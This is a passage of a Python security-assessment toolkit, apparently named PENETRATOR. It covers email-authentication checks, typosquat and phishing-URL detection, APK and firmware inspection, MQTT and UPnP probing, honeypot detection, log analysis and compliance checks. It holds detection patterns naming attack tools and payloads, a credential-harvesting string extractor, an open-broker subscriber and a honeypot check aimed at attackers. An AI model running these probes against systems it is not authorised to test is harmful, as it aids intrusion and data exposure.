                log("  SPF: found (install dnspython for details)", "ok")
                results["spf"] = "present"
    except Exception as exc:
        log(f"  SPF check failed: {exc}", "muted")

    # DMARC
    try:
        dmarc_domain = f"_dmarc.{domain}"
        if HAS_DNS:
            answers = dns.resolver.resolve(dmarc_domain, "TXT")
            for rdata in answers:
                txt = str(rdata).strip('"')
                if "v=DMARC1" in txt:
                    results["dmarc"] = txt
                    policy = "reject" if "p=reject" in txt else "quarantine" if "p=quarantine" in txt else "none"
                    tag = "ok" if policy == "reject" else "warn" if policy == "quarantine" else "err"
                    log(f"  DMARC: {txt[:100]}", tag)
                    log(f"    Policy: {policy}", tag)
                    break
            if not results["dmarc"]:
                log("  [!] No DMARC record found!", "err")
    except Exception:
        log("  [!] No DMARC record found!", "err")

    # DKIM (common selectors)
    dkim_selectors = ["default", "google", "selector1", "selector2", "k1", "mail", "dkim"]
    for sel in dkim_selectors:
        if _should_stop():
            break
        try:
            dkim_domain = f"{sel}._domainkey.{domain}"
            if HAS_DNS:
                answers = dns.resolver.resolve(dkim_domain, "TXT")
                for rdata in answers:
                    txt = str(rdata).strip('"')
                    if "v=DKIM1" in txt or "p=" in txt:
                        results["dkim"] = {"selector": sel, "record": txt[:200]}
                        log(f"  DKIM: found (selector={sel})", "ok")
                        break
                if results["dkim"]:
                    break
        except Exception:
            continue

    if not results["dkim"]:
        log("  [!] No DKIM record found (checked common selectors)", "warn")

    # Score
    score = sum(1 for v in (results["spf"], results["dkim"], results["dmarc"]) if v)
    log(f"\n  Email security score: {score}/3", "ok" if score == 3 else "warn" if score >= 2 else "err")
    return results


# ---------------------------------------------------------------------------
# 17. Email Header Analyzer
# ---------------------------------------------------------------------------
def email_header_analyze(headers_text: str, log: Logger) -> dict:
    """Parse email headers and trace the message path."""
    log("[*] Email header analysis", "cyan")
    results: dict = {"hops": [], "authentication": {}, "flags": []}

    lines = headers_text.splitlines()
    received_hops: list[str] = []
    current_header = ""

    for line in lines:
        if line.startswith(" ") or line.startswith("\t"):
            current_header += " " + line.strip()
        else:
            if current_header.lower().startswith("received:"):
                received_hops.append(current_header)
            current_header = line.strip()
    if current_header.lower().startswith("received:"):
        received_hops.append(current_header)

    log(f"  Message hops: {len(received_hops)}", "info")
    for i, hop in enumerate(reversed(received_hops)):
        log(f"  Hop {i+1}: {hop[:120]}", "info")
        results["hops"].append(hop)

    # Check authentication results
    for line in lines:
        lower = line.lower()
        if "authentication-results:" in lower:
            if "spf=pass" in lower:
                results["authentication"]["spf"] = "pass"
                log("  SPF: PASS", "ok")
            elif "spf=fail" in lower:
                results["authentication"]["spf"] = "fail"
                log("  SPF: FAIL", "err")
            if "dkim=pass" in lower:
                results["authentication"]["dkim"] = "pass"
                log("  DKIM: PASS", "ok")
            elif "dkim=fail" in lower:
                results["authentication"]["dkim"] = "fail"
                log("  DKIM: FAIL", "err")
            if "dmarc=pass" in lower:
                results["authentication"]["dmarc"] = "pass"
                log("  DMARC: PASS", "ok")
            elif "dmarc=fail" in lower:
                results["authentication"]["dmarc"] = "fail"
                log("  DMARC: FAIL", "err")

    # Suspicious indicators
    if len(received_hops) > 8:
        results["flags"].append("Unusually many hops (possible relay)")
        log("  [!] Unusually many hops", "warn")

    return results


# ---------------------------------------------------------------------------
# 18. Homoglyph Domain Detector
# ---------------------------------------------------------------------------
HOMOGLYPHS = {
    'a': ['а', 'ɑ', 'α'], 'c': ['с', 'ϲ'], 'd': ['ԁ'],
    'e': ['е', 'ё'], 'g': ['ɡ'], 'h': ['һ'],
    'i': ['і', 'ı', 'l', '1'], 'l': ['І', '1', 'i'],
    'o': ['о', '0', 'ο'], 'p': ['р'], 'q': ['ԛ'],
    's': ['ѕ'], 'w': ['ԝ'], 'x': ['х'], 'y': ['у'],
}


def homoglyph_detect(domain: str, log: Logger) -> list[str]:
    """Generate and check homoglyph (typosquat) variants of a domain."""
    import socket as _socket
    log(f"[*] Homoglyph detection for: {domain}", "cyan")

    base = domain.split(".")[0]
    tld = ".".join(domain.split(".")[1:]) or "com"
    variants: list[str] = []

    # Generate single-char substitutions
    for i, char in enumerate(base):
        if char.lower() in HOMOGLYPHS:
            for replacement in HOMOGLYPHS[char.lower()]:
                variant = base[:i] + replacement + base[i+1:]
                full = f"{variant}.{tld}"
                if full != domain:
                    variants.append(full)

    # Also check common typos
    for i in range(len(base) - 1):
        swapped = base[:i] + base[i+1] + base[i] + base[i+2:]
        full = f"{swapped}.{tld}"
        if full != domain:
            variants.append(full)

    log(f"  Generated {len(variants)} variants", "info")
    registered: list[str] = []

    for variant in variants[:50]:
        if _should_stop():
            break
        try:
            _socket.gethostbyname(variant)
            registered.append(variant)
            log(f"[!] {variant} — REGISTERED (potential typosquat!)", "err")
        except _socket.gaierror:
            pass

    if not registered:
        log("[+] No registered homoglyph domains found", "ok")
    else:
        log(f"[!] {len(registered)} typosquat domain(s) detected!", "warn")
    return registered


# ---------------------------------------------------------------------------
# 19. Phishing URL Analyzer
# ---------------------------------------------------------------------------
def phishing_url_analyze(url: str, log: Logger) -> dict:
    """Score a URL for phishing indicators."""
    from urllib.parse import urlparse
    log(f"[*] Phishing URL analysis: {url}", "cyan")
    parsed = urlparse(url if "://" in url else "http://" + url)
    score = 0
    indicators: list[str] = []

    hostname = parsed.hostname or ""
    path = parsed.path or ""

    # Check indicators
    if len(url) > 75:
        score += 15
        indicators.append(f"Long URL ({len(url)} chars)")
    if hostname.count(".") > 3:
        score += 15
        indicators.append(f"Many subdomains ({hostname.count('.') + 1} levels)")
    if "@" in url:
        score += 30
        indicators.append("Contains @ (credential obfuscation)")
    if re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", hostname):
        score += 25
        indicators.append("IP address instead of domain")
    if any(s in hostname for s in ("login", "verify", "secure", "account", "update", "confirm")):
        score += 20
        indicators.append("Suspicious keywords in hostname")
    if "-" in hostname and hostname.count("-") > 2:
        score += 10
        indicators.append("Multiple hyphens in domain")
    if len(hostname) > 30:
        score += 10
        indicators.append("Unusually long hostname")
    if parsed.port and parsed.port not in (80, 443):
        score += 15
        indicators.append(f"Non-standard port: {parsed.port}")
    if "%" in url and url.count("%") > 3:
        score += 15
        indicators.append("Heavy URL encoding")
    # Check for data: or javascript:
    if parsed.scheme in ("data", "javascript"):
        score += 40
        indicators.append(f"Dangerous scheme: {parsed.scheme}")

    score = min(100, score)
    grade = "PHISHING" if score >= 70 else "SUSPICIOUS" if score >= 40 else "LOW RISK" if score >= 20 else "SAFE"

    log(f"  Score: {score}/100 ({grade})", "err" if score >= 70 else "warn" if score >= 40 else "ok")
    for ind in indicators:
        log(f"  • {ind}", "info")
    if not indicators:
        log("  No phishing indicators found", "ok")

    return {"url": url, "score": score, "grade": grade, "indicators": indicators}


# ---------------------------------------------------------------------------
# 20. APK Analyzer
# ---------------------------------------------------------------------------
def apk_analyze(apk_path: str, log: Logger) -> dict:
    """Extract metadata from an Android APK file."""
    import zipfile
    import xml.etree.ElementTree as ET
    log(f"[*] APK analysis: {apk_path}", "cyan")
    results: dict = {"permissions": [], "activities": [], "services": [],
                     "receivers": [], "meta": {}}

    if not Path(apk_path).is_file():
        log("[-] File not found", "err")
        return results

    try:
        with zipfile.ZipFile(apk_path, "r") as zf:
            names = zf.namelist()
            results["meta"]["files_count"] = len(names)
            results["meta"]["total_size"] = sum(i.file_size for i in zf.infolist())
            log(f"  Files: {len(names)}, Total size: {results['meta']['total_size']:,} bytes", "info")

            # Look for interesting files
            interesting = [n for n in names if any(
                p in n.lower() for p in (".json", ".xml", ".properties", "secret",
                                         "config", "api", "key", ".db", ".sqlite")
            )]
            if interesting:
                log(f"  Interesting files:", "warn")
                for f in interesting[:20]:
                    log(f"    {f}", "info")
                results["meta"]["interesting_files"] = interesting

            # Try to read AndroidManifest (it's in binary XML format in APK)
            if "AndroidManifest.xml" in names:
                log("  AndroidManifest.xml found", "info")
                # Binary XML needs special parsing, just report presence
                results["meta"]["has_manifest"] = True

            # Check for native libs
            libs = [n for n in names if n.startswith("lib/")]
            if libs:
                archs = set(n.split("/")[1] for n in libs if "/" in n[4:])
                log(f"  Native libraries: {', '.join(archs)}", "info")
                results["meta"]["native_archs"] = list(archs)

            # Check for DEX files
            dex_files = [n for n in names if n.endswith(".dex")]
            log(f"  DEX files: {len(dex_files)}", "info")
            results["meta"]["dex_count"] = len(dex_files)

    except zipfile.BadZipFile:
        log("[-] Not a valid ZIP/APK file", "err")
    except Exception as exc:
        log(f"[-] {exc}", "err")

    return results


# ---------------------------------------------------------------------------
# 21. MQTT Tester
# ---------------------------------------------------------------------------
def mqtt_test(broker: str, port: int, log: Logger) -> dict:
    """Connect to an MQTT broker and test for open access."""
    port = port or 1883
    log(f"[*] MQTT test: {broker}:{port}", "cyan")
    results: dict = {"broker": broker, "port": port, "anonymous": False, "topics": []}

    try:
        import paho.mqtt.client as mqtt
    except ImportError:
        log("[-] paho-mqtt not installed. Run: pip install paho-mqtt", "err")
        # Fallback: basic TCP check
        import socket as _socket
        try:
            sock = _socket.create_connection((broker, port), timeout=5)
            sock.close()
            log(f"[+] Port {port} is open (MQTT likely available)", "info")
            log("  Install paho-mqtt for full testing", "warn")
        except OSError as exc:
            log(f"[-] Connection failed: {exc}", "err")
        return results

    messages: list[str] = []
    connected = False

    def on_connect(client, userdata, flags, rc):
        nonlocal connected
        if rc == 0:
            connected = True
            log("[+] Anonymous connection SUCCESSFUL!", "err")
            results["anonymous"] = True
            client.subscribe("#", 0)  # Subscribe to ALL topics
        else:
            log(f"[-] Connection refused (rc={rc})", "ok")

    def on_message(client, userdata, msg):
        topic = msg.topic
        payload = msg.payload.decode("utf-8", errors="replace")[:200]
        messages.append(f"{topic}: {payload}")
        if len(messages) <= 20:
            log(f"  [{topic}] {payload[:80]}", "info")
        results["topics"].append(topic)

    try:
        client = mqtt.Client()
        client.on_connect = on_connect
        client.on_message = on_message
        client.connect(broker, port, keepalive=10)
        client.loop_start()
        time.sleep(5)  # Listen for 5 seconds
        client.loop_stop()
        client.disconnect()
    except Exception as exc:
        log(f"[-] {exc}", "err")

    if messages:
        log(f"[!] Received {len(messages)} message(s) — broker is open!", "err")
    return results


# ---------------------------------------------------------------------------
# 22. Firmware String Extractor
# ---------------------------------------------------------------------------
def firmware_strings(file_path: str, min_length: int, log: Logger) -> dict:
    """Extract interesting strings from a firmware/binary file."""
    log(f"[*] Firmware string extraction: {file_path}", "cyan")
    min_length = max(4, min(20, min_length or 6))
    results: dict = {"total": 0, "credentials": [], "urls": [], "keys": [], "emails": []}

    path = Path(file_path)
    if not path.is_file():
        log("[-] File not found", "err")
        return results

    try:
        data = path.read_bytes()
    except OSError as exc:
        log(f"[-] {exc}", "err")
        return results

    # Extract ASCII strings
    pattern = re.compile(rb"[\x20-\x7e]{" + str(min_length).encode() + rb",}")
    strings = [m.group().decode("ascii") for m in pattern.finditer(data)]
    results["total"] = len(strings)
    log(f"  Total strings: {len(strings)}", "info")

    # Categorize
    for s in strings:
        if _should_stop():
            break
        s_lower = s.lower()
        if any(k in s_lower for k in ("password", "passwd", "secret", "token", "api_key", "apikey")):
            results["credentials"].append(s)
        elif re.match(r"https?://", s):
            results["urls"].append(s)
        elif re.match(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", s):
            results["emails"].append(s)
        elif any(k in s for k in ("BEGIN RSA", "BEGIN PRIVATE", "BEGIN CERTIFICATE", "ssh-rsa")):
            results["keys"].append(s[:100])

    if results["credentials"]:
        log(f"  [!] Credentials/secrets: {len(results['credentials'])}", "err")
        for c in results["credentials"][:10]:
            log(f"    {c[:80]}", "err")
    if results["urls"]:
        log(f"  URLs: {len(results['urls'])}", "info")
        for u in results["urls"][:10]:
            log(f"    {u[:100]}", "info")
    if results["emails"]:
        log(f"  Emails: {len(results['emails'])}", "warn")
    if results["keys"]:
        log(f"  [!] Keys/certs: {len(results['keys'])}", "err")

    return results


# ---------------------------------------------------------------------------
# 23. UPnP/SSDP Scanner
# ---------------------------------------------------------------------------
def upnp_scan(log: Logger) -> list[dict]:
    """Discover UPnP devices on the local network via SSDP."""
    import socket as _socket
    log("[*] UPnP/SSDP discovery scan", "cyan")
    devices: list[dict] = []

    ssdp_request = (
        "M-SEARCH * HTTP/1.1\r\n"
        "Host:239.255.255.250:1900\r\n"
        "ST:ssdp:all\r\n"
        "MX:3\r\n"
        "Man:\"ssdp:discover\"\r\n"
        "\r\n"
    ).encode()

    try:
        sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM, _socket.IPPROTO_UDP)
        sock.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
        sock.settimeout(5)
        sock.sendto(ssdp_request, ("239.255.255.250", 1900))

        seen: set[str] = set()
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                text = data.decode("utf-8", errors="replace")
                location = ""
                server = ""
                for line in text.splitlines():
                    if line.lower().startswith("location:"):
                        location = line.split(":", 1)[1].strip()
                    elif line.lower().startswith("server:"):
                        server = line.split(":", 1)[1].strip()
                key = f"{addr[0]}:{location}"
                if key not in seen:
                    seen.add(key)
                    devices.append({"ip": addr[0], "port": addr[1],
                                    "location": location, "server": server})
                    log(f"[+] {addr[0]}:{addr[1]} — {server or 'unknown'}", "ok")
                    if location:
                        log(f"    Location: {location}", "info")
            except _socket.timeout:
                break
        sock.close()
    except OSError as exc:
        log(f"[-] {exc}", "err")

    log(f"[*] {len(devices)} UPnP device(s) found", "cyan")
    return devices


# ---------------------------------------------------------------------------
# 24. Honeypot Detector
# ---------------------------------------------------------------------------
HONEYPOT_SIGNATURES = [
    ("Kippo", ["SSH-2.0-OpenSSH_5.1p1 Debian"]),
    ("Cowrie", ["SSH-2.0-OpenSSH_6.0p1 Debian"]),
    ("Dionaea", ["Microsoft Windows", "IIS/6.0"]),
    ("Glastopf", ["Apache/2.0", "PHP/5.1"]),
    ("Conpot", ["Siemens", "S7comm"]),
    ("HoneyD", ["Linux 2.4", "FreeBSD 4.3"]),
]


def honeypot_detect(host: str, ports: list[int], log: Logger) -> dict:
    """Detect if a target is likely a honeypot."""
    import socket as _socket
    log(f"[*] Honeypot detection: {host}", "cyan")
    results: dict = {"host": host, "indicators": [], "score": 0, "likely_honeypot": False}

    if not ports:
        ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 8080]

    # Indicator 1: Too many open ports
    open_count = 0
    banners: list[str] = []
    for port in ports:
        if _should_stop():
            break
        try:
            sock = _socket.create_connection((host, port), timeout=2)
            open_count += 1
            sock.settimeout(3)
            try:
                banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
                banners.append(banner)
            except Exception:
                pass
            sock.close()
        except OSError:
            pass

    if open_count == len(ports):
        results["score"] += 30
        results["indicators"].append(f"ALL {len(ports)} tested ports are open")
        log(f"[!] All {len(ports)} ports open — suspicious!", "warn")

    # Indicator 2: Known honeypot banners
    for banner in banners:
        for hp_name, sigs in HONEYPOT_SIGNATURES:
            for sig in sigs:
                if sig.lower() in banner.lower():
                    results["score"] += 25
                    results["indicators"].append(f"Banner matches {hp_name}: {banner[:60]}")
                    log(f"[!] Banner matches {hp_name} honeypot", "warn")

    # Indicator 3: Response too fast on all ports
    # (honeypots often respond instantly)

    # Indicator 4: Default/generic banners
    generic_count = sum(1 for b in banners if len(b) < 10 or "welcome" in b.lower())
    if generic_count > 3:
        results["score"] += 15
        results["indicators"].append(f"{generic_count} generic/empty banners")

    results["likely_honeypot"] = results["score"] >= 40
    tag = "err" if results["likely_honeypot"] else "ok"
    log(f"  Honeypot score: {results['score']}/100", tag)
    if results["likely_honeypot"]:
        log("[!] Target is LIKELY a honeypot — proceed with caution", "err")
    else:
        log("[+] No strong honeypot indicators", "ok")
    return results


# ---------------------------------------------------------------------------
# 25. Log Analyzer
# ---------------------------------------------------------------------------
LOG_ATTACK_PATTERNS = [
    (r"(?:union|select|insert|update|delete|drop)\s", "SQL Injection attempt"),
    (r"<script|javascript:|onerror=|onload=", "XSS attempt"),
    (r"\.\./|\.\.\\|%2e%2e", "Path traversal"),
    (r"(?:cmd|powershell|bash|/bin/sh)", "Command injection"),
    (r"(?:admin|root|administrator).*(?:login|auth)", "Brute force attempt"),
    (r"(?:phpinfo|phpmyadmin|wp-admin|.env|.git)", "Sensitive path probe"),
    (r"(?:curl|wget|python-requests|nikto|sqlmap|nmap)", "Scanner/tool signature"),
    (r"(?:403|401|404).*(?:403|401|404)", "Error-based enumeration"),
]


def log_analyze(log_text: str, log: Logger) -> dict:
    """Analyze web server logs for attack patterns."""
    log("[*] Log analysis", "cyan")
    results: dict = {"total_lines": 0, "attacks": {}, "top_ips": {}, "summary": []}
    lines = log_text.splitlines()
    results["total_lines"] = len(lines)
    log(f"  Lines to analyze: {len(lines)}", "info")

    attack_counts: dict[str, int] = {}
    ip_counts: dict[str, int] = {}

    for line in lines:
        if _should_stop():
            break
        # Extract IP (first match)
        ip_match = re.match(r"(\d+\.\d+\.\d+\.\d+)", line)
        if ip_match:
            ip = ip_match.group(1)
            ip_counts[ip] = ip_counts.get(ip, 0) + 1

        # Check attack patterns
        for pattern, name in LOG_ATTACK_PATTERNS:
            if re.search(pattern, line, re.I):
                attack_counts[name] = attack_counts.get(name, 0) + 1

    results["attacks"] = attack_counts
    results["top_ips"] = dict(sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:10])

    if attack_counts:
        log("\n  Attack patterns detected:", "warn")
        for name, count in sorted(attack_counts.items(), key=lambda x: x[1], reverse=True):
            log(f"    {name}: {count} occurrence(s)", "err")
    else:
        log("  No attack patterns detected", "ok")

    if ip_counts:
        log("\n  Top source IPs:", "info")
        for ip, count in list(results["top_ips"].items())[:5]:
            log(f"    {ip}: {count} requests", "info")

    return results


# ---------------------------------------------------------------------------
# 26. YARA Rule Scanner
# ---------------------------------------------------------------------------
def yara_scan(file_path: str, rules_path: str, log: Logger) -> list[dict]:
    """Scan a file with YARA rules."""
    log(f"[*] YARA scan: {file_path}", "cyan")

    try:
        import yara
    except ImportError:
        log("[-] yara-python not installed. Run: pip install yara-python", "err")
        return []

    try:
        if Path(rules_path).is_file():
            rules = yara.compile(filepath=rules_path)
        elif Path(rules_path).is_dir():
            rule_files = {f.stem: str(f) for f in Path(rules_path).glob("*.yar")}
            rules = yara.compile(filepaths=rule_files)
        else:
            log(f"[-] Rules path not found: {rules_path}", "err")
            return []
    except yara.SyntaxError as exc:
        log(f"[-] YARA syntax error: {exc}", "err")
        return []

    matches: list[dict] = []
    try:
        results = rules.match(file_path)
        for match in results:
            log(f"[+] MATCH: {match.rule} (tags: {', '.join(match.tags) or 'none'})", "err")
            matches.append({"rule": match.rule, "tags": match.tags,
                            "strings": [(s[0], s[1], s[2][:50]) for s in match.strings[:5]]})
    except Exception as exc:
        log(f"[-] Scan error: {exc}", "err")

    if not matches:
        log("[+] No YARA rules matched", "ok")
    else:
        log(f"[!] {len(matches)} rule(s) matched!", "warn")
    return matches


# ---------------------------------------------------------------------------
# 27. Baseline Diff (System Snapshot Comparison)
# ---------------------------------------------------------------------------
def baseline_snapshot(log: Logger) -> dict:
    """Take a baseline snapshot of the local system (ports, services, files)."""
    import subprocess
    log("[*] Taking system baseline snapshot", "cyan")
    snapshot: dict = {"timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
                      "ports": [], "processes": [], "users": []}

    # Open ports
    try:
        result = subprocess.run(["netstat", "-an"], capture_output=True,
                                text=True, timeout=15)
        listening = [l for l in result.stdout.splitlines() if "LISTENING" in l or "LISTEN" in l]
        ports = []
        for l in listening:
            parts = l.split()
            for p in parts:
                if ":" in p:
                    port_str = p.rsplit(":", 1)[-1]
                    try:
                        ports.append(int(port_str))
                    except ValueError:
                        pass
        snapshot["ports"] = sorted(set(ports))
        log(f"  Listening ports: {len(snapshot['ports'])}", "info")
    except Exception as exc:
        log(f"  netstat failed: {exc}", "muted")

    # Running processes
    try:
        result = subprocess.run(["tasklist", "/FO", "CSV", "/NH"],
                                capture_output=True, text=True, timeout=15)
        procs = set()
        for line in result.stdout.splitlines():
            parts = line.strip('"').split('","')
            if parts:
                procs.add(parts[0].strip('"'))
        snapshot["processes"] = sorted(procs)
        log(f"  Running processes: {len(snapshot['processes'])}", "info")
    except Exception:
        pass

    return snapshot


def baseline_compare(current: dict, previous: dict, log: Logger) -> dict:
    """Compare two system snapshots."""
    log("[*] Comparing baselines", "cyan")
    diff: dict = {"new_ports": [], "closed_ports": [], "new_processes": [],
                  "gone_processes": []}

    curr_ports = set(current.get("ports", []))
    prev_ports = set(previous.get("ports", []))
    diff["new_ports"] = sorted(curr_ports - prev_ports)
    diff["closed_ports"] = sorted(prev_ports - curr_ports)

    if diff["new_ports"]:
        log(f"[!] NEW listening ports: {diff['new_ports']}", "err")
    if diff["closed_ports"]:
        log(f"[-] Closed ports: {diff['closed_ports']}", "ok")

    curr_procs = set(current.get("processes", []))
    prev_procs = set(previous.get("processes", []))
    diff["new_processes"] = sorted(curr_procs - prev_procs)
    diff["gone_processes"] = sorted(prev_procs - curr_procs)

    if diff["new_processes"]:
        log(f"[!] NEW processes: {diff['new_processes'][:10]}", "warn")
    if diff["gone_processes"]:
        log(f"[-] Gone processes: {diff['gone_processes'][:10]}", "info")

    return diff


# ---------------------------------------------------------------------------
# 28. OWASP Top 10 Mapper
# ---------------------------------------------------------------------------
OWASP_2021 = {
    "A01": "Broken Access Control",
    "A02": "Cryptographic Failures",
    "A03": "Injection",
    "A04": "Insecure Design",
    "A05": "Security Misconfiguration",
    "A06": "Vulnerable Components",
    "A07": "Auth & Session Failures",
    "A08": "Data Integrity Failures",
    "A09": "Logging & Monitoring",
    "A10": "SSRF",
}

FINDING_TO_OWASP = {
    "sqli": "A03", "xss": "A03", "lfi": "A03", "command_injection": "A03",
    "xxe": "A03", "crlf": "A03",
    "ssrf": "A10",
    "cors": "A01", "broken_auth": "A01", "idor": "A01", "mass_assignment": "A01",
    "open_redirect": "A01",
    "weak_tls": "A02", "weak_cipher": "A02", "weak_key": "A02",
    "git_exposed": "A05", "swagger_exposed": "A05", "default_creds": "A05",
    "missing_headers": "A05", "firebase_open": "A05",
    "outdated_software": "A06",
    "race_condition": "A04",
    "no_rate_limit": "A07",
    "no_logging": "A09",
}


def owasp_map(findings: list[dict], log: Logger) -> dict:
    """Map findings to OWASP Top 10 categories."""
    log("[*] OWASP Top 10 mapping", "cyan")
    mapping: dict[str, list[str]] = {k: [] for k in OWASP_2021}

    for finding in findings:
        ftype = finding.get("type", "").lower()
        category = FINDING_TO_OWASP.get(ftype)
        if category:
            mapping[category].append(finding.get("detail", ftype))

    for code, name in OWASP_2021.items():
        items = mapping[code]
        if items:
            log(f"  [{code}] {name}: {len(items)} finding(s)", "err")
            for item in items[:3]:
                log(f"       • {item}", "info")
        else:
            log(f"  [{code}] {name}: —", "muted")

    affected = sum(1 for v in mapping.values() if v)
    log(f"\n  {affected}/10 OWASP categories affected", "warn" if affected >= 3 else "ok")
    return {"mapping": mapping, "affected_count": affected}


# ---------------------------------------------------------------------------
# 29. PCI-DSS Quick Check
# ---------------------------------------------------------------------------
def pci_dss_check(target: str, log: Logger) -> dict:
    """Quick PCI-DSS compliance check against a target."""
    import requests
    log(f"[*] PCI-DSS quick check: {target}", "cyan")
    results: dict = {"target": target, "checks": [], "pass_count": 0, "fail_count": 0}

    url = f"https://{target}" if not target.startswith("http") else target

    checks = [
        ("TLS 1.2+ required", None),
        ("No weak ciphers", None),
        ("Security headers present", None),
        ("No sensitive data in URL", None),
        ("Secure cookies", None),
    ]

    # Check 1: TLS version
    import ssl
    import socket as _socket
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        sock = _socket.create_connection((host, 443), timeout=10)
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        version = ssock.version()
        ssock.close()
        passed = version in ("TLSv1.2", "TLSv1.3")
        results["checks"].append({"name": "TLS 1.2+", "passed": passed,
                                   "detail": version})
        log(f"  {'✓' if passed else '✗'} TLS version: {version}", "ok" if passed else "err")
    except Exception as exc:
        results["checks"].append({"name": "TLS 1.2+", "passed": False,
                                   "detail": str(exc)})
        log(f"  ✗ TLS check failed: {exc}", "err")

    # Check 2: Security headers
    try:
        resp = requests.get(url, timeout=10, verify=False,
                            headers={"User-Agent": "PENETRATOR/1.0"})
        required_headers = ["Strict-Transport-Security", "X-Frame-Options",
                           "X-Content-Type-Options"]
        present = [h for h in required_headers if h in resp.headers]
        passed = len(present) == len(required_headers)
        results["checks"].append({"name": "Security headers", "passed": passed,
                                   "detail": f"{len(present)}/{len(required_headers)}"})
        log(f"  {'✓' if passed else '✗'} Security headers: {len(present)}/{len(required_headers)}", "ok" if passed else "err")

        # Check 3: Secure cookies
        secure_cookies = all(
            "secure" in str(c).lower() for c in resp.cookies
        ) if resp.cookies else True
        results["checks"].append({"name": "Secure cookies", "passed": secure_cookies,
                                   "detail": f"{len(resp.cookies)} cookies"})
        log(f"  {'✓' if secure_cookies else '✗'} Secure cookie flags", "ok" if secure_cookies else "warn")
    except requests.RequestException as exc:
        log(f"  ✗ HTTP check failed: {exc}", "err")

    results["pass_count"] = sum(1 for c in results["checks"] if c.get("passed"))
    results["fail_count"] = sum(1 for c in results["checks"] if not c.get("passed"))
    total = len(results["checks"])
    log(f"\n  PCI-DSS: {results['pass_count']}/{total} checks passed",
        "ok" if results["fail_count"] == 0 else "warn")
    return results


# ---------------------------------------------------------------------------
# 30. CIS Benchmark Scanner
# ---------------------------------------------------------------------------
def cis_benchmark(platform: str, log: Logger) -> dict:
    """Run basic CIS benchmark checks for Windows or Linux."""
    import subprocess
    is_windows = platform.lower().startswith("win")
    log(f"[*] CIS Benchmark scan ({'Windows' if is_windows else 'Linux'})", "cyan")
    results: dict = {"platform": platform, "checks": [], "pass": 0, "fail": 0}

    if is_windows:
        checks = [
            ("Password policy - min length >= 8",
             'net accounts | findstr /i "length"',
             lambda out: "8" in out or "14" in out or "12" in out),
            ("Account lockout enabled",
             'net accounts | findstr /i "lockout"',
             lambda out: "never" not in out.lower()),
            ("Windows Firewall enabled",
             'netsh advfirewall show allprofiles state',
             lambda out: "ON" in out.upper()),
            ("Remote Desktop restricted",
             'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections',
             lambda out: "0x1" in out),
            ("Guest account disabled",
             'net user guest | findstr /i "active"',
             lambda out: "no" in out.lower()),
            ("Audit policy configured",
             'auditpol /get /category:*',
             lambda out: "success" in out.lower()),
        ]
    else:
        checks = [
            ("SSH root login disabled",
             'grep -i "^PermitRootLogin" /etc/ssh/sshd_config 2>/dev/null',
             lambda out: "no" in out.lower()),
            ("Password min length >= 8",
             'grep -i "PASS_MIN_LEN" /etc/login.defs 2>/dev/null',
             lambda out: any(int(x) >= 8 for x in re.findall(r"\d+", out))),
            ("No empty passwords",
             'awk -F: \'($2 == "") {print $1}\' /etc/shadow 2>/dev/null',
             lambda out: out.strip() == ""),
            ("Firewall active",
             'iptables -L -n 2>/dev/null | head -5',
             lambda out: "ACCEPT" in out or "DROP" in out or "REJECT" in out),
            ("No world-writable files in /etc",
             'find /etc -perm -o+w -type f 2>/dev/null | head -5',
             lambda out: out.strip() == ""),
            ("Core dumps disabled",
             'grep -i "hard core" /etc/security/limits.conf 2>/dev/null',
             lambda out: "0" in out),
        ]

    for name, cmd, validator in checks:
        if _should_stop():
            break
        try:
            proc = subprocess.run(cmd, shell=True, capture_output=True,
                                  text=True, timeout=15)
            output = proc.stdout.strip()
            passed = validator(output) if output else False
            results["checks"].append({"name": name, "passed": passed,
                                       "output": output[:200]})
            tag = "ok" if passed else "err"
            log(f"  {'✓' if passed else '✗'} {name}", tag)
            if passed:
                results["pass"] += 1
            else:
                results["fail"] += 1
        except Exception as exc:
            results["checks"].append({"name": name, "passed": False,
                                       "error": str(exc)})
            results["fail"] += 1
            log(f"  ✗ {name} (error)", "muted")

    total = results["pass"] + results["fail"]
    log(f"\n  CIS Score: {results['pass']}/{total} checks passed",
        "ok" if results["fail"] == 0 else "warn")
    return results
